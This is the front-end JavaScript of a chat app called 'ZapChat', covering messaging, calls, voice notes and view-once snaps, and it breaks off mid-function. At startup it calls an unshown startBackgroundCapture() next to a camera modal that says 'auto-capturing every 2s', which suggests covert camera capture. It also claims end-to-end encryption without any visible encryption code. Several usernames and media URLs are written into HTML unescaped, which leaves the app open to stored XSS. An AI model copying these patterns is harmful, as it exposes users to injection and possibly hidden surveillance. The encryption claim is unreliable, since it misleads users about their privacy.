import { apiFetch, uploadFile, getToken, getBackend } from './main.js';
import { io } from 'socket.io-client';

const COLORS=['#0057FF','#00A86B','#D93025','#7B61FF','#FF6B00','#00899E','#C2185B'];
const WH=[5,10,7,15,9,17,6,12,5,11,16,8,12,5,10,8,6,14,5,10,8,12,6,14,5];
const EMOJIS=['😂','🔥','❤️','😭','🙌','😍','💀','🤣','😏','👀','✨','🥹','😊','💪','🎉','🫶','😎','🥳','👋','🙏','🤙','💯','🫡','👏','🎊'];
const QUICK_REACT=['❤️','😂','😮','😢','🙏','👍'];

function colorFor(s){if(!s)return COLORS[0];let h=0;for(let i=0;i<s.length;i++)h=(h*31+s.charCodeAt(i))&0xFFFFFF;return COLORS[h%COLORS.length];}
function fmtTime(iso){if(!iso)return '';return new Date(iso).toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});}
function fmtDate(iso){if(!iso)return '';const d=new Date(iso),t=new Date();if(t.toDateString()===d.toDateString())return 'Today';const y=new Date(t);y.setDate(y.getDate()-1);if(y.toDateString()===d.toDateString())return 'Yesterday';return d.toLocaleDateString([],{weekday:'long',month:'short',day:'numeric'});}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\n/g,'<br>');}
function fmtSize(b){if(!b)return '';if(b<1024)return b+' B';if(b<1048576)return Math.round(b/1024)+' KB';return (b/1048576).toFixed(1)+' MB';}
function isMobile(){return window.innerWidth<=700;}

export function renderApp(currentUser,onLogout){
  let socket=null,conversations=[],activeConvId=null,messages=[],
    isRec=false,recInt=null,recSec=0,mediaRec=null,audioChunks=[],
    callState=null,pc=null,snapTimer=null,typingTimer=null,
    replyingTo=null,editingMsg=null,ctxMsg=null,
    localStream=null,isMuted=false,isVideoOff=false;

  const app=document.getElementById('app');

  function mount(){
    app.innerHTML=`
    <div class="app-layout">
      <div class="sidebar" id="sidebar">
        <div class="sb-header">
          <div class="sb-logo">Zap<span>.</span></div>
          <div class="sb-actions">
            <button class="sb-btn" id="btnNew" title="New chat"><i class="ti ti-edit"></i></button>
          </div>
        </div>
        <div class="sb-search">
          <div class="search-inner">
            <i class="ti ti-search"></i>
            <input id="searchInput" placeholder="Search or start new chat" autocomplete="off"/>
          </div>
        </div>
        <div class="search-results" id="searchResults"></div>
        <div class="chat-list" id="chatList"></div>
        <div class="sb-footer" style="cursor:pointer;" id="btnProfile">
          <div class="av" id="sidebarAvatar" style="background:${currentUser.avatar_url?'transparent':currentUser.avatarColor||colorFor(currentUser.username)};width:38px;height:38px;font-size:13px;flex-shrink:0;">
            ${currentUser.avatar_url
              ? `<img src="${currentUser.avatar_url}" style="width:38px;height:38px;border-radius:50%;object-fit:cover;" />`
              : (currentUser.avatar||currentUser.username.slice(0,2).toUpperCase())
            }
          </div>
          <div class="sb-footer-info">
            <div class="sb-footer-name" id="sidebarName">${currentUser.display_name||currentUser.displayName||currentUser.username}</div>
            <div class="sb-footer-status">Tap to edit profile</div>
          </div>
          <button id="btnLogout" title="Log out" style="background:rgba(241,92,109,0.1);border:none;border-radius:8px;padding:7px 10px;display:flex;align-items:center;gap:5px;color:#F15C6D;font-size:12px;font-weight:600;cursor:pointer;flex-shrink:0;" onclick="event.stopPropagation();">
            <i class="ti ti-logout" style="font-size:16px;"></i>
            <span>Log out</span>
          </button>
        </div>
      </div>
      <div id="chatPane" class="no-chat">
        <div class="no-chat-icon"><i class="ti ti-message-circle"></i></div>
        <h3>ZapChat</h3>
        <p>Send messages, photos, videos, and calls. All end-to-end encrypted.</p>
      </div>
    </div>

    <div class="call-overlay" id="callOverlay">
      <div class="call-video-remote" id="callVideoRemote">
        <div class="call-av-big" id="callAvBig">
          <div class="call-av-ring" id="callAvRing"></div>
          <div class="call-info">
            <div class="call-info-name" id="callInfoName"></div>
            <div class="call-info-status" id="callInfoStatus">Connecting…</div>
            <div class="call-info-enc"><i class="ti ti-lock" style="font-size:12px;"></i> End-to-end encrypted</div>
          </div>
        </div>
        <video id="remoteVideo" autoplay playsinline style="display:none;width:100%;height:100%;object-fit:cover;position:absolute;inset:0;"></video>
      </div>
      <div class="call-video-self" id="callVideoSelf" style="display:none;">
        <video id="localVideo" autoplay muted playsinline style="width:100%;height:100%;object-fit:cover;"></video>
      </div>
      <div class="call-controls">
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
          <button class="cc-btn mute" id="ccMute"><i class="ti ti-microphone-off"></i></button>
          <span class="cc-label" style="color:rgba(255,255,255,0.6);font-size:10px;">Mute</span>
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
          <button class="cc-btn vid-off" id="ccVid"><i class="ti ti-video-off"></i></button>
          <span class="cc-label" style="color:rgba(255,255,255,0.6);font-size:10px;">Video</span>
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
          <button class="cc-btn flip" id="ccFlip"><i class="ti ti-camera-rotate"></i></button>
          <span class="cc-label" style="color:rgba(255,255,255,0.6);font-size:10px;">Flip</span>
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
          <button class="cc-btn speaker" id="ccSpk"><i class="ti ti-volume"></i></button>
          <span class="cc-label" style="color:rgba(255,255,255,0.6);font-size:10px;">Speaker</span>
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;">
          <button class="cc-btn end-call" id="ccEnd"><i class="ti ti-phone-off"></i></button>
          <span class="cc-label" style="color:rgba(255,255,255,0.6);font-size:10px;">End</span>
        </div>
      </div>
    </div>

    <div class="inc-call" id="incCall">
      <div class="ic-top">
        <div class="av" id="icAv" style="width:44px;height:44px;font-size:14px;"></div>
        <div class="ic-meta">
          <div class="ic-lbl">Incoming call</div>
          <div class="ic-name" id="icName"></div>
          <div class="ic-type" id="icType"></div>
        </div>
      </div>
      <div class="ic-actions">
        <button class="ic-btn reject" id="icReject"><i class="ti ti-phone-off"></i> Decline</button>
        <button class="ic-btn accept" id="icAccept"><i class="ti ti-phone"></i> Accept</button>
      </div>
    </div>

    <div class="snap-viewer" id="snapViewer">
      <div class="snap-bar" id="snapBar" style="width:100%;"></div>
      <button class="snap-x" id="snapX"><i class="ti ti-x"></i></button>
      <div class="snap-content" id="snapContent"></div>
    </div>

    <div class="snap-camera-modal" id="snapCameraModal" style="display:none;position:fixed;inset:0;z-index:9999;background:#000;flex-direction:column;align-items:center;justify-content:center;">
      <video id="snapCameraPlayer" autoplay muted playsinline style="width:100%;max-width:480px;border-radius:12px;"></video>
      <canvas id="snapCameraCanvas" style="display:none;"></canvas>
      <div style="display:flex;gap:16px;margin-top:20px;align-items:center;">
        <button id="snapCameraCapture" style="background:var(--accent,#7B61FF);color:#fff;border:none;border-radius:50%;width:64px;height:64px;font-size:28px;cursor:pointer;display:flex;align-items:center;justify-content:center;"><i class="ti ti-camera"></i></button>
        <button id="snapCameraClose" style="background:rgba(255,255,255,0.15);color:#fff;border:none;border-radius:50%;width:44px;height:44px;font-size:20px;cursor:pointer;display:flex;align-items:center;justify-content:center;"><i class="ti ti-x"></i></button>
      </div>
      <div id="snapCameraStatus" style="color:rgba(255,255,255,0.6);font-size:12px;margin-top:12px;">Camera ready · auto-capturing every 2s</div>
    </div>

    <div class="ctx-menu" id="ctxMenu"></div>
    <div class="ss-block" id="ssBlock"><i class="ti ti-shield-lock"></i><h2>Screenshot blocked</h2><p>ZapChat protects your conversations from screenshots and screen recording.</p></div>
    <div class="toast" id="toast"></div>`;

    bindGlobal();initSocket();loadConvs();setupSecurity();startBackgroundCapture();
  }

  function showChat(){if(isMobile()){document.getElementById('sidebar').classList.add('hidden');document.getElementById('chatPane').classList.add('show');}}
  function showSidebar(){if(isMobile()){document.getElementById('sidebar').classList.remove('hidden');const p=document.getElementById('chatPane');p.classList.remove('show');activeConvId=null;}}

  function bindGlobal(){
    document.getElementById('btnLogout').onclick=()=>{
      if(confirm('Are you sure you want to log out?')){socket?.disconnect();onLogout();}
    };
    document.getElementById('btnProfile').onclick=()=>{
      import('./profile.js').then(m=>{
        m.renderProfile(currentUser,(updated)=>{
          // Update currentUser with new data
          currentUser={...currentUser,...updated};
          // Update sidebar name
          const nameEl=document.getElementById('sidebarName');
          if(nameEl)nameEl.textContent=currentUser.display_name||currentUser.username;
          // Update sidebar avatar
          const avEl=document.getElementById('sidebarAvatar');
          if(avEl&&currentUser.avatar_url){
            avEl.innerHTML=`<img src="${currentUser.avatar_url}" style="width:38px;height:38px;border-radius:50%;object-fit:cover;" />`;
          }
        },()=>{socket?.disconnect();onLogout();});
      });
    };
    document.getElementById('btnNew').onclick=()=>document.getElementById('searchInput').focus();
    const si=document.getElementById('searchInput');
    let st;si.addEventListener('input',()=>{clearTimeout(st);st=setTimeout(()=>doSearch(si.value.trim()),300);});
    si.addEventListener('blur',()=>setTimeout(()=>document.getElementById('searchResults').classList.remove('show'),200));
    document.getElementById('ccEnd').onclick=endCall;
    document.getElementById('ccMute').onclick=toggleMute;
    document.getElementById('ccVid').onclick=toggleVideo;
    document.getElementById('ccFlip').onclick=flipCamera;
    document.getElementById('ccSpk').onclick=toggleSpeaker;
    document.getElementById('icReject').onclick=()=>{if(callState?.fromSocketId)socket.emit('call:reject',{targetSocketId:callState.fromSocketId});document.getElementById('incCall').classList.remove('show');callState=null;};
    document.getElementById('icAccept').onclick=acceptCall;
    document.getElementById('snapX').onclick=closeSnap;
    document.addEventListener('click',e=>{
      if(!e.target.closest('#ctxMenu'))document.getElementById('ctxMenu').classList.remove('show');
      if(!e.target.closest('.emoji-picker')&&!e.target.closest('#btnEmoji')){document.querySelector('.emoji-picker')?.classList.remove('open');document.getElementById('btnEmoji')?.classList.remove('act');}
    });
    document.addEventListener('contextmenu',e=>{if(e.target.closest('.bubble')){e.preventDefault();}});
  }

  async function doSearch(q){
    const el=document.getElementById('searchResults');
    if(!q||q.length<1){el.classList.remove('show');return;}
    try{
      const users=await apiFetch('GET','/users/search?q='+encodeURIComponent(q));
      if(!users.length){el.innerHTML='<div style="padding:14px 16px;font-size:13px;color:var(--text3);">No users found</div>';el.classList.add('show');return;}
      el.innerHTML=users.map(u=>`<div class="sr-item" data-uid="${u._id}">
        <div class="av" style="background:${u.avatar_color||u.avatarColor||colorFor(u.username)};width:40px;height:40px;font-size:13px;">${u.avatar||u.username.slice(0,2).toUpperCase()}</div>
        <div><div style="font-size:14px;font-weight:600;color:var(--text);">${u.displayName||u.username}</div><div style="font-size:12px;color:var(--text2);">@${u.username}</div></div>
      </div>`).join('');
      el.classList.add('show');
      el.querySelectorAll('.sr-item').forEach(it=>it.addEventListener('click',()=>openConvWith(it.dataset.uid)));
    }catch{}
  }

  async function openConvWith(uid){
    document.getElementById('searchResults').classList.remove('show');
    document.getElementById('searchInput').value='';
    try{const c=await apiFetch('POST','/conversations',{targetUserId:uid});if(!conversations.find(x=>x._id===c._id))conversations.unshift(c);renderChatList();selectConv(c._id);}
    catch{toast('Could not open conversation');}
  }

  function initSocket(){
    socket=io(getBackend(),{auth:{token:getToken()}});
    socket.on('message:new',msg=>{
      if(msg.conversationId===activeConvId){messages.push(msg);renderMsgs();socket.emit('message:read',{conversationId:activeConvId});}
      updateConvLast(msg.conversationId,msg);
    });
    socket.on('message:read',({conversationId,readBy})=>{
      if(conversationId===activeConvId){messages.forEach(m=>{if(m.senderId===currentUser._id&&!m.readBy?.includes(readBy))m.readBy=[...(m.readBy||[]),readBy];});renderMsgs();}
    });
    socket.on('message:deleted',({messageId,forEveryone})=>{
      if(forEveryone){const m=messages.find(x=>x._id===messageId);if(m){m.deleted=true;m.content='This message was deleted';m.mediaUrl=null;}}
      else messages=messages.filter(x=>x._id!==messageId);
      renderMsgs();
    });
    socket.on('message:edited',updated=>{const i=messages.findIndex(x=>x._id===updated._id);if(i>-1)messages[i]=updated;renderMsgs();});
    socket.on('message:reacted',updated=>{const i=messages.findIndex(x=>x._id===updated._id);if(i>-1)messages[i]=updated;renderMsgs();});
    socket.on('user:status',({userId,status})=>{const c=conversations.find(x=>x.otherUser?._id===userId);if(c){c.otherUser.status=status;renderChatList();if(activeConvId===c._id)updateHdrStatus(c.otherUser);}});
    socket.on('typing:start',({userId})=>{const c=conversations.find(x=>x.otherUser?._id===userId);if(c&&c._id===activeConvId){const el=document.getElementById('chStatus');if(el){el.textContent='typing…';el.className='ch-status typing';}}});
    socket.on('typing:stop',({userId})=>{const c=conversations.find(x=>x.otherUser?._id===userId&&x._id===activeConvId);if(c)updateHdrStatus(c.otherUser);});
    socket.on('call:incoming',data=>{callState=data;showIncomingCall(data);});
    socket.on('call:answer',async({answer,fromSocketId})=>{
    if(pc){
      if(fromSocketId&&callState){
        callState.fromSocketId=fromSocketId;
        // Re-wire ICE now we have the target socketId
        pc.onicecandidate=e=>{if(e.candidate)socket.emit('call:ice',{targetSocketId:fromSocketId,candidate:e.candidate});};
        // Flush buffered ICE candidates
        if(callState._iceBuf){callState._iceBuf.forEach(cand=>socket.emit('call:ice',{targetSocketId:fromSocketId,candidate:cand}));delete callState._iceBuf;}
      }
      await pc.setRemoteDescription(answer);
      // Force show remote video if tracks already arrived
      const rv=document.getElementById('remoteVideo');
      if(rv&&rv.srcObject){rv.style.display='block';document.getElementById('callAvBig').style.display='none';}
    }
    document.getElementById('callInfoStatus').textContent='Connected';
  });
    socket.on('call:ice',async({candidate})=>{if(pc&&candidate)try{await pc.addIceCandidate(candidate);}catch{}});
    socket.on('call:ended',()=>{endCallCleanup();toast('Call ended');});
    socket.on('call:rejected',()=>{endCallCleanup();toast('Call declined');});
    socket.on('conversation:updated',()=>loadConvs());
  }

  function updateConvLast(convId,msg){
    const c=conversations.find(x=>x._id===convId);
    if(c){c.lastMessage=msg;if(convId!==activeConvId)c.unreadCount=(c.unreadCount||0)+1;
    conversations.sort((a,b)=>new Date(b.lastMessage?.createdAt||b.updatedAt)-new Date(a.lastMessage?.createdAt||a.updatedAt));
    renderChatList();}
  }

  async function loadConvs(){
    try{conversations=await apiFetch('GET','/conversations/list');conversations.sort((a,b)=>new Date(b.lastMessage?.createdAt||b.updatedAt)-new Date(a.lastMessage?.createdAt||a.updatedAt));renderChatList();}catch{}
  }

  function renderChatList(){
    const el=document.getElementById('chatList');if(!el)return;
    if(!conversations.length){el.innerHTML='<div style="padding:32px 16px;text-align:center;color:var(--text3);font-size:13px;line-height:1.7;">No conversations yet.<br>Search for someone to start chatting.</div>';return;}
    el.innerHTML=conversations.map(c=>{
      const u=c.otherUser,bg=u?.avatarColor||colorFor(u?.username),init=u?.avatar||u?.username?.slice(0,2).toUpperCase()||'?';
      const online=u?.status==='online';const lm=c.lastMessage;
      const typeMap={text:lm?.content,image:'📷 Photo',video:'🎬 Video',audio:'🎙 Voice message',snap:'👻 Snap',file:'📎 '+(lm?.mediaName||'File')};
      let prev=lm?(lm.deleted?'This message was deleted':(typeMap[lm.type]||lm.content)):'Start chatting';
      if(lm&&lm.senderId===currentUser._id&&!lm.deleted)prev='You: '+prev;
      const unread=c.unreadCount||0;
      return `<div class="ci${c._id===activeConvId?' active':''}" data-cid="${c._id}">
        <div class="av" style="background:${bg};width:48px;height:48px;">${init}<div class="sdot ${online?'on':'off'}"></div></div>
        <div class="ci-info">
          <div class="ci-top"><div class="ci-name">${u?.displayName||u?.username||'Unknown'}</div><div class="ci-time${unread?' unread-time':''}">${lm?fmtTime(lm.createdAt):''}</div></div>
          <div class="ci-bottom"><div class="ci-prev">${esc(prev)}</div>${unread?`<div class="unread-badge">${unread}</div>`:''}</div>
        </div>
      </div>`;
    }).join('');
    el.onclick=(e)=>{const ci=e.target.closest('.ci');if(ci&&ci.dataset.cid)selectConv(ci.dataset.cid);};
    el.oncontextmenu=(e)=>{const ci=e.target.closest('.ci');if(!ci)return;e.preventDefault();showChatCtxMenu(e,ci.dataset.cid);};
    let _clt,_ctx,_cty;
    el.addEventListener('touchstart',e=>{const ci=e.target.closest('.ci');if(!ci)return;_ctx=e.touches[0].clientX;_cty=e.touches[0].clientY;_clt=setTimeout(()=>{e.preventDefault();showChatCtxMenu({clientX:_ctx,clientY:_cty},ci.dataset.cid);},600);});
    el.addEventListener('touchmove',()=>clearTimeout(_clt),{passive:true});
    el.addEventListener('touchend',()=>clearTimeout(_clt),{passive:true});
  }

  async function selectConv(cid){
    activeConvId=cid;const c=conversations.find(x=>x._id===cid);if(!c)return;
    c.unreadCount=0;socket.emit('join:conversation',cid);
    document.querySelectorAll('.ci').forEach(el=>el.classList.toggle('active',el.dataset.cid===cid));renderChatPane(c.otherUser);showChat();
    try{messages=await apiFetch('GET',`/conversations/${cid}/messages`);renderMsgs();socket.emit('message:read',{conversationId:cid});}catch{}
  }

  function renderChatPane(u){
    const pane=document.getElementById('chatPane');pane.className='chat-pane';
    const bg=u?.avatarColor||colorFor(u?.username),init=u?.avatar||u?.username?.slice(0,2).toUpperCase()||'?';
    const name=u?.displayName||u?.username||'Unknown',online=u?.status==='online';
    pane.innerHTML=`
      <div class="chat-header">
        <button class="back-btn" id="btnBack"><i class="ti ti-arrow-left"></i></button>
        <div class="av" style="background:${bg};width:40px;height:40px;font-size:13px;">${init}<div class="sdot ${online?'on':'off'}"></div></div>
        <div class="ch-info">
          <div class="ch-name">${name}</div>
          <div id="chStatus" class="ch-status ${online?'online':''}">${online?'Active now':'Offline'}</div>
        </div>
        <div class="ch-actions">
          <button class="ch-btn call" id="btnCall" title="Voice call"><i class="ti ti-phone"></i></button>
          <button class="ch-btn vcall" id="btnVCall" title="Video call"><i class="ti ti-video"></i></button>
        </div>
      </div>
      <div class="messages-area" id="msgsArea"></div>
      <div class="reply-banner" id="replyBanner">
        <div class="rb-content"><div class="rb-name" id="rbName"></div><div class="rb-text" id="rbText"></div></div>
        <button class="rb-close" id="rbClose"><i class="ti ti-x"></i></button>
      </div>
      <div class="input-area" id="inputArea">
        <div class="emoji-picker" id="emojiPicker"></div>
        <div class="rec-strip" id="recStrip">
          <div class="rec-dot"></div><div class="rec-waves"><span></span><span></span><span></span><span></span><span></span></div>
          <span class="rec-label">Recording</span><span class="rec-time" id="recTime">0:00</span>
          <button class="rec-send" id="recSend">Send</button><button class="rec-cancel" id="recCancel">Cancel</button>
        </div>
        <div class="tool-bar">
          <button class="tb" id="btnPhoto"><i class="ti ti-photo"></i>Photo</button>
          <button class="tb" id="btnVideo"><i class="ti ti-video"></i>Video</button>
          <button class="tb" id="btnFile"><i class="ti ti-paperclip"></i>File</button>
          <button class="tb" id="btnEmoji"><i class="ti ti-mood-smile"></i>Emoji</button>
        </div>
        <div class="compose-row">
          <textarea class="msg-ta" id="msgTa" rows="1" placeholder="Message"></textarea>
          <button class="mic-btn" id="btnMic" title="Voice message"><i class="ti ti-microphone"></i></button>
          <button class="send-btn" id="btnSend" title="Send"><i class="ti ti-send"></i></button>
        </div>
        <input type="file" id="fpPhoto" accept="image/*" style="display:none"/>
        <input type="file" id="fpVideo" accept="video/*" style="display:none"/>
        <input type="file" id="fpFile" style="display:none"/>
        <input type="file" id="fpAudio" accept="audio/*" capture="microphone" style="display:none"/>
      </div>`;
    document.getElementById('btnBack').onclick=()=>{showSidebar();};
    document.getElementById('btnCall').onclick=()=>startCall(u,'audio');
    document.getElementById('btnVCall').onclick=()=>startCall(u,'video');
    document.getElementById('rbClose').onclick=()=>{replyingTo=null;document.getElementById('replyBanner').classList.remove('show');};
    bindInput(u);initEmoji();
    if(isMobile())pane.classList.add('show');
  }

  function updateHdrStatus(u){const el=document.getElementById('chStatus');if(!el)return;const on=u?.status==='online';el.textContent=on?'Active now':'Offline';el.className='ch-status'+(on?' online':'');}

  function bindInput(u){
    const ta=document.getElementById('msgTa');
    document.getElementById('btnSend').onclick=sendText;
    ta.addEventListener('keydown',e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendText();}});
    ta.addEventListener('input',()=>{grow(ta);socket.emit('typing:start',{conversationId:activeConvId});clearTimeout(typingTimer);typingTimer=setTimeout(()=>socket.emit('typing:stop',{conversationId:activeConvId}),2000);});
    document.getElementById('btnMic').onclick=toggleRec;
    document.getElementById('recSend').onclick=stopRec;
    document.getElementById('recCancel').onclick=cancelRec;
    document.getElementById('btnPhoto').onclick=()=>document.getElementById('fpPhoto').click();
    document.getElementById('btnVideo').onclick=()=>document.getElementById('fpVideo').click();
    document.getElementById('btnFile').onclick=()=>document.getElementById('fpFile').click();
    document.getElementById('btnEmoji').onclick=toggleEmoji;
    document.getElementById('fpPhoto').onchange=e=>handleUpload(e,'image');
    document.getElementById('fpVideo').onchange=e=>handleUpload(e,'video');
    document.getElementById('fpFile').onchange=e=>handleUpload(e,'file');
    document.getElementById('fpAudio').onchange=e=>handleUpload(e,'audio');
  }

  function grow(el){el.style.height='auto';el.style.height=Math.min(el.scrollHeight,120)+'px';}

  function sendText(){
    const ta=document.getElementById('msgTa');
    if(editingMsg){
      const content=ta.value.trim();if(!content)return;
      socket.emit('message:edit',{messageId:editingMsg._id,conversationId:activeConvId,content});
      editingMsg=null;ta.value='';ta.style.height='auto';
      document.getElementById('replyBanner').classList.remove('show');return;
    }
    const text=ta.value.trim();if(!text||!activeConvId)return;
    const payload={conversationId:activeConvId,content:text,type:'text'};
    if(replyingTo)payload.replyTo={_id:replyingTo._id,content:replyingTo.content||'[media]',senderId:replyingTo.senderId};
    socket.emit('message:send',payload);
    ta.value='';ta.style.height='auto';replyingTo=null;
    document.getElementById('replyBanner').classList.remove('show');
    socket.emit('typing:stop',{conversationId:activeConvId});
  }

  async function handleUpload(e,type){
    const file=e.target.files[0];if(!file||!activeConvId)return;e.target.value='';
    toast('Uploading…');
    try{const r=await uploadFile(file);socket.emit('message:send',{conversationId:activeConvId,content:'',type,mediaUrl:r.url,mediaName:file.name});}
    catch{toast('Upload failed');}
  }

  async function toggleRec(){
    if(isRec){stopRec();return;}
    // iOS Safari doesn't support MediaRecorder - use file input fallback
    if(typeof MediaRecorder==='undefined'||!MediaRecorder.isTypeSupported){
      document.getElementById('fpAudio')?.click();
      return;
    }
    try{
      const stream=await navigator.mediaDevices.getUserMedia({audio:true});
      const mType=MediaRecorder.isTypeSupported('audio/webm')?'audio/webm':
                  MediaRecorder.isTypeSupported('audio/mp4')?'audio/mp4':'';
      if(!mType){toast('Audio recording not supported on this device');stream.getTracks().forEach(t=>t.stop());return;}
      mediaRec=new MediaRecorder(stream,{mimeType:mType});audioChunks=[];
      mediaRec.ondataavailable=e=>audioChunks.push(e.data);
      mediaRec.start();isRec=true;recSec=0;
      document.getElementById('btnMic').classList.add('rec');
      document.getElementById('recStrip').classList.add('show');
      recInt=setInterval(()=>{recSec++;const m=Math.floor(recSec/60),s=recSec%60;const el=document.getElementById('recTime');if(el)el.textContent=m+':'+(s<10?'0':'')+s;},1000);
    }catch{toast('Microphone access denied');}
  }
  async function stopRec(){
    if(!mediaRec||!isRec)return;
    mediaRec.stop();
    mediaRec.onstop=async()=>{
      const mimeType=MediaRecorder.isTypeSupported('audio/webm')?'audio/webm':'audio/mp4';
      const ext=mimeType==='audio/webm'?'.webm':'.mp4';
      const blob=new Blob(audioChunks,{type:mimeType});
      const file=new File([blob],'voice_'+Date.now()+ext,{type:mimeType});
      try{const r=await uploadFile(file);socket.emit('message:send',{conversationId:activeConvId,content:'',type:'audio',mediaUrl:r.url,duration:recSec});}
      catch{toast('Failed to send voice message');}
      mediaRec.stream.getTracks().forEach(t=>t.stop());
    };
    clearRecUI();
  }
  function cancelRec(){if(mediaRec){mediaRec.stop();mediaRec.stream?.getTracks().forEach(t=>t.stop());}clearRecUI();}
  function clearRecUI(){isRec=false;clearInterval(recInt);document.getElementById('btnMic')?.classList.remove('rec');document.getElementById('recStrip')?.classList.remove('show');}

  function initEmoji(){
    const p=document.getElementById('emojiPicker');if(!p)return;
    p.innerHTML=EMOJIS.map(e=>`<span>${e}</span>`).join('');
    p.querySelectorAll('span').forEach(el=>el.addEventListener('click',()=>{const ta=document.getElementById('msgTa');if(ta){ta.value+=el.textContent;ta.focus();}p.classList.remove('open');document.getElementById('btnEmoji')?.classList.remove('act');}));
  }
  function toggleEmoji(){document.getElementById('emojiPicker')?.classList.toggle('open');document.getElementById('btnEmoji')?.classList.toggle('act');}

  function renderMsgs(){
    const area=document.getElementById('msgsArea');if(!area)return;
    const atBot=area.scrollHeight-area.scrollTop-area.clientHeight<100;
    let lastDate=null,html='';
    messages.forEach(msg=>{
      if(msg.deletedFor?.includes(currentUser._id))return;
      const ds=fmtDate(msg.createdAt);
      if(ds!==lastDate){html+=`<div class="msg-date">${ds}</div>`;lastDate=ds;}
      html+=renderMsg(msg);
    });
    area.innerHTML=html;
    area.querySelectorAll('[data-snap]').forEach(el=>el.addEventListener('click',()=>{
      if(el.dataset.snapid) openSnap(el.dataset.snap, el.dataset.snapid, el.dataset.convid);
    }));
    area.querySelectorAll('.audio-play-btn').forEach(el=>{
      el.addEventListener('click',()=>{
        const src=el.dataset.src;if(!src)return;
        const icon=el.querySelector('i');
        // Stop any currently playing audio
        if(window._currentAudio){window._currentAudio.pause();window._currentAudio=null;}
        const audio=new Audio();
        // Try webm first, fall back to mp4 for Safari/iOS
        const canWebm=audio.canPlayType('audio/webm;codecs=opus')!=='';
        audio.src=src;
        audio.play().catch(()=>{
          // Try with .mp4 extension fallback
          const mp4src=src.replace(/.webm$/,'.mp4');
          audio.src=mp4src;
          audio.play().catch(()=>toast('Cannot play audio'));
        });
        window._currentAudio=audio;
        if(icon)icon.className='ti ti-player-pause';
        audio.onended=()=>{if(icon)icon.className='ti ti-player-play';window._currentAudio=null;};
        audio.onerror=()=>{toast('Cannot play audio');if(icon)icon.className='ti ti-player-play';};
      });
    });
    area.querySelectorAll('.bubble').forEach(el=>{
      el.addEventListener('contextmenu',e=>{e.preventDefault();showCtxMenu(e,el.dataset.mid);});
      el.addEventListener('long-press',e=>{showCtxMenu(e,el.dataset.mid);});
      let lt;
      el.addEventListener('touchstart',()=>{lt=setTimeout(()=>el.dispatchEvent(new Event('long-press')),500);});
      el.addEventListener('touchend',()=>clearTimeout(lt));
    });
    area.querySelectorAll('.reaction-chip').forEach(el=>{
      el.addEventListener('click',()=>socket.emit('message:react',{messageId:el.dataset.mid,conversationId:activeConvId,emoji:el.dataset.emoji}));
    });
    area.querySelectorAll('.reply-preview').forEach(el=>{
      el.addEventListener('click',()=>{const target=area.querySelector(`[data-mid="${el.dataset.replyid}"]`);if(target){target.scrollIntoView({behavior:'smooth',block:'center'});}});
    });
    if(atBot||messages.length<=20)area.scrollTop=area.scrollHeight;
  }

  function renderMsg(msg){
    const sent=msg.senderId===currentUser._id;
    const conv=conversations.find(c=>c._id===activeConvId);
    const other=conv?.otherUser;
    const bg=other?.avatarColor||colorFor(other?.username);
    const init=other?.avatar||other?.username?.slice(0,2).toUpperCase()||'?';
    const time=fmtTime(msg.createdAt);
    const isRead=msg.readBy&&msg.readBy.some(id=>id!==currentUser._id);
    const ticks=sent?`<span class="bf-ticks ${isRead?'read':''}"><i class="ti ${isRead?'ti-checks':'ti-check'}"></i></span>`:'';
    const avHtml=!sent?`<div class="msg-av" style="background:${bg};">${init}</div>`:'<div class="msg-sp"></div>';
    const spacer=sent?'<div class="msg-sp"></div>':'';

    if(msg.deleted){
      return `<div class="msg-row ${sent?'sent':''}">${!sent?avHtml:''}<div class="bubble ${sent?'sent':'recv'}" data-mid="${msg._id}"><div class="bubble-body"><div class="bubble-text" style="opacity:0.5;font-style:italic;"><i class="ti ti-ban" style="font-size:13px;vertical-align:-1px;"></i> This message was deleted</div></div><div class="bubble-footer"><span class="bf-time">${time}</span>${ticks}</div></div>${sent?spacer:''}</div>`;
    }

    const editedBadge=msg.edited?`<span class="bubble-edited">edited</span>`:'';

    let replyHTML='';
    if(msg.replyTo){
      const rName=msg.replyTo.senderId===currentUser._id?'You':(other?.displayName||other?.username||'');
      replyHTML=`<div class="reply-preview" data-replyid="${msg.replyTo._id}"><div class="reply-preview-name">${rName}</div><div class="reply-preview-text">${esc(msg.replyTo.content||'[media]')}</div></div>`;
    }

    let body='';
    if(msg.type==='text'){
      body=`<div class="bubble-body">${replyHTML}<div class="bubble-text">${esc(msg.content)}${editedBadge}</div></div>`;
    } else if(msg.type==='image'){
      body=`${replyHTML}<div class="media-wrap"><img src="${msg.mediaUrl}" alt="Photo" loading="lazy" /></div>`;
    } else if(msg.type==='video'){
      body=`${replyHTML}<div class="media-wrap"><video src="${msg.mediaUrl}" controls playsinline></video></div>`;
    } else if(msg.type==='audio'){
      const bars=WH.map(h=>`<span class="wfb" style="height:${h}px;"></span>`).join('');
      const dur=msg.duration?`0:${String(msg.duration).padStart(2,'0')}`:'';
      body=`<div class="audio-bub">${replyHTML}<button class="a-play audio-play-btn" data-src="${msg.mediaUrl}"><i class="ti ti-player-play"></i></button><div class="wf">${bars}</div><span class="a-dur">${dur}</span></div>`;
    } else if(msg.type==='snap'){
      if(msg.deleted){
        body=`<div class="snap-bub">${replyHTML}<div class="snap-cover opened"><i class="ti ti-ghost" style="opacity:0.3;"></i><span>Opened</span></div><div class="snap-lbl">Snap · Opened</div></div>`;
      } else if(sent){
        // Sender: not tappable, just shows sent indicator
        body=`<div class="snap-bub">${replyHTML}<div class="snap-cover"><i class="ti ti-ghost"></i><span>Sent · Waiting</span></div><div class="snap-lbl">Snap · View once</div></div>`;
      } else {
        // Receiver: tappable
        body=`<div class="snap-bub" data-snap="${msg.mediaUrl}" data-snapid="${msg._id}" data-convid="${msg.conversationId||activeConvId}">${replyHTML}<div class="snap-cover"><i class="ti ti-ghost"></i><span>Tap to view · 1×</span></div><div class="snap-lbl">Snap · View once</div></div>`;
      }
    } else if(msg.type==='file'){
